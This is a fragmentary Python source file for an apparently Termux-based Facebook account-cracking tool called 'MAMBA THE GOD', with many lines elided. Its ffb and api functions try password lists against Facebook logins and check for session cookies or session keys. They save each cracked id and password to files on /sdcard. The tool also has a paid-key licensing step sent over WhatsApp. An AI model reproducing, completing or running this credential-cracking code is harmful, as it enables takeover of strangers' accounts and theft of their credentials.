...
#os.system('xdg-open https://facebook.com/badshahkking21')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  GOD.txt  etc..')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/badshahking21');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi God Sir, I Need To Buy Your Paid MAMBA The God Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python world.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MAMBA THE GOD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MAMBA=session.cookies.get_dict().keys()
                        if "c_user" in MAMBA:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MAMBA THE GOD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MAMBA THE GOD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MAMBA:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MAMBA THE GOD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MAMBA THE GOD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MAMBA THE GOD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MAMBA THE GOD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MAMBA THE GOD-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MAMBA THE GOD-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MAMBA THE GOD-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MAMBA THE GOD-OK] '+uid+' | '+pas+'\033[1;97m')
